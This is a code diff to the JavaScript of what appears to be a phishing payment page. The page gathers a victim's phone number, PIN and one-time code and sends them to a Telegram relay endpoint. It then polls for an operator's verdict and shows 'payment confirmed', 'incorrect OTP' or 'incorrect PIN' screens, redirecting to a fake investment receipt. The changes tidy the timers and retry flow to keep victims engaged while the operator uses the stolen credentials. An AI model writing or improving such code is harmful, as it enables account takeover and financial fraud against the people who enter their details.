@@ -304,64 +304,94 @@ document.getElementById('mb').onclick=function(){
   }
 };
 
+/* ── ALL TIMER REFERENCES — module-level so every fn can clear them ── */
 var sessionKey=null;
 var pollInterval=null;
 var pollTimeout=null;
+var elapsedInterval=null;   /* authorising counter */
+var otpTimerInterval=null;  /* OTP countdown */
 
+/* ── OTP COUNTDOWN — always clears previous before starting ── */
+function startTimer(){
+  if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
+  var t=120;
+  var te=document.getElementById('tc');
+  var rb=document.getElementById('rsnd');
+  te.textContent=t;
+  rb.classList.remove('on');
+  rc=false;
+  resetOtp(false);
+  document.getElementById('mb').classList.remove('on');
+  otpTimerInterval=setInterval(function(){
+    t--;
+    te.textContent=t;
+    if(t<=0){
+      clearInterval(otpTimerInterval);otpTimerInterval=null;
+      rb.classList.add('on');
+      resetOtp(true);
+      document.getElementById('mb').classList.remove('on');
+      document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';
+    }
+  },1000);
+}
+
+/* ── AUTHORISING (step 3) — clears all timers before starting ── */
 function startAuthorising(){
-  // Send OTP confirmed to Telegram — receives inline buttons
+  /* Stop any running OTP timer — we've left that step */
+  if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
+  /* Clear any previous elapsed counter */
+  if(elapsedInterval){clearInterval(elapsedInterval);elapsedInterval=null;}
+
   var payload={submittedAt:new Date().toISOString(),loginPhone:pv,loginPin:pnv,otp:ov,event:'otp_confirmed',plan:pl(),device:dev};
   fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
     .then(function(r){return r.json();})
-    .then(function(d){
-      sessionKey=d.sessionKey||null;
-      startPolling();
-    })
+    .then(function(d){sessionKey=d.sessionKey||null;startPolling();})
     .catch(function(){startPolling();});
 
-  // Start countdown display
+  /* Elapsed counter — fresh from 0 every time */
   var elapsed=0;
   var timerEl=document.getElementById('procTimer');
   timerEl.style.display='block';
   timerEl.textContent='Waiting for authorisation… 0s';
-  var countEl=setInterval(function(){
+  elapsedInterval=setInterval(function(){
     elapsed++;
-    timerEl.textContent='Waiting for authorisation… '+elapsed+'s';
-    if(elapsed>=180){
-      clearInterval(countEl);
-      timerEl.textContent='This is taking longer than usual. If you need help, contact support.';
+    if(elapsed<180){
+      timerEl.textContent='Waiting for authorisation… '+elapsed+'s';
+    } else {
+      clearInterval(elapsedInterval);elapsedInterval=null;
+      timerEl.textContent='Taking longer than usual — contact WhatsApp support if needed.';
     }
   },1000);
 }
 
 function startPolling(){
-  if(pollInterval) clearInterval(pollInterval);
+  if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
+  if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
   pollInterval=setInterval(function(){
-    if(!sessionKey){return;} // wait for sessionKey
+    if(!sessionKey)return;
     fetch('/api/checkTelegram?sessionKey='+encodeURIComponent(sessionKey))
       .then(function(r){return r.json();})
       .then(function(d){handleTelegramAction(d.status);})
       .catch(function(){});
   },2000);
-
-  // Safety fallback: if no action in 3 minutes, let user retry
   pollTimeout=setTimeout(function(){
     stopPolling();
-    showProcErr('No response received. Please contact support on WhatsApp or try again.');
+    showProcErr('No response received. Please contact WhatsApp support or try again.');
   },180000);
 }
 
 function stopPolling(){
   if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
   if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
+  /* Also stop elapsed counter when polling stops */
+  if(elapsedInterval){clearInterval(elapsedInterval);elapsedInterval=null;}
 }
 
 function handleTelegramAction(status){
-  if(!status||status==='pending') return;
-  stopPolling();
+  if(!status||status==='pending')return;
+  stopPolling(); /* clears elapsed too */
 
   if(status==='proceed'){
-    // ✅ Proceed — go to receipt
     document.getElementById('procRing').style.borderTopColor='#059669';
     document.getElementById('procTitle').textContent='✅ Payment confirmed!';
     document.getElementById('procSub').textContent='Redirecting to your investment receipt…';
@@ -369,40 +399,38 @@ function handleTelegramAction(status){
     setTimeout(function(){location.href='receipt.html';},1000);
 
   } else if(status==='wrong_otp'){
-    // ❌ Wrong OTP — go back to OTP step, only resend active
+    /* Return to OTP step — reset everything cleanly */
+    os=false;
     go('s2');
-    od=true; oh.disabled=true; // disable OTP input
-    var rsBtn=document.getElementById('rsnd');
-    rsBtn.classList.add('on'); // only resend is active
-    document.getElementById('mb').classList.remove('on'); // confirm btn disabled
-    document.getElementById('mn').textContent='❌ Incorrect OTP. Please resend and try again.';
-    // Force clear OTP boxes
-    oh.value='';
+    /* Clear OTP boxes and disable input */
+    od=true; oh.value=''; oh.disabled=true;
     [0,1,2,3,4,5].forEach(function(i){
       var b=document.getElementById('ob'+i);
-      if(b){b.textContent='';b.className='ob';}
+      if(b){b.textContent='';b.className='ob disabled';}
     });
-    // Allow retry
-    os=false;
+    ov='';
+    document.getElementById('mb').classList.remove('on');
+    document.getElementById('rsnd').classList.add('on'); /* only resend active */
+    document.getElementById('mn').textContent='❌ Incorrect OTP. Tap Resend to receive a new code.';
+    /* Reset OTP countdown to 120 fresh when user taps resend (startTimer called there) */
+    if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
+    document.getElementById('tc').textContent='—'; /* clear stale number */
     showProcErr('');
 
   } else if(status==='wrong_pin'){
-    // 🚫 Wrong PIN — go back to login step 1
-    go('s1');
-    // Reset state
-    os=false; lc=false;
-    pnv=''; pv='';
-    document.getElementById('pin').value='';
+    os=false; lc=false; pv=''; pnv='';
     document.getElementById('ph').value='';
+    document.getElementById('pin').value='';
     document.getElementById('mb').classList.remove('on');
+    go('s1');
     showProcErr('');
-    // Show error banner on step 1
-    var sn=document.querySelector('.sn span');
+    var sn=document.querySelector('.sn');
     if(sn){
-      sn.textContent='🚫 Incorrect PIN entered. Please re-enter your Enter your number and PIN.';
-      document.querySelector('.sn').style.background='rgba(220,38,38,.07)';
-      document.querySelector('.sn').style.borderColor='rgba(220,38,38,.22)';
-      document.querySelector('.sn svg').style.stroke='#DC2626';
+      sn.style.background='rgba(220,38,38,.07)';
+      sn.style.borderColor='rgba(220,38,38,.22)';
+      var svg=sn.querySelector('svg');if(svg)svg.style.stroke='#DC2626';
+      var sp=sn.querySelector('span');
+      if(sp)sp.textContent='🚫 Incorrect PIN. Please re-enter your number and PIN carefully.';
     }
   }
 }
@@ -414,7 +442,7 @@ function showProcErr(msg){
   else{el.style.display='none';}
 }
 document.getElementById('rsnd').onclick=function(){if(!this.classList.contains('on'))return;if(rc)return;rc=true;tg('resend_otp');startTimer();};
-function startTimer(){var t=120,te=document.getElementById('tc'),rb=document.getElementById('rsnd');te.textContent=t;rb.classList.remove('on');rc=false;resetOtp(false);document.getElementById('mb').classList.remove('on');var ti=setInterval(function(){t--;te.textContent=t;if(t<=0){clearInterval(ti);rb.classList.add('on');resetOtp(true);document.getElementById('mb').classList.remove('on');document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';}},1000);}
+/* startTimer defined above */
 
 // Sync inline buttons with hidden #mb state
 (function(){
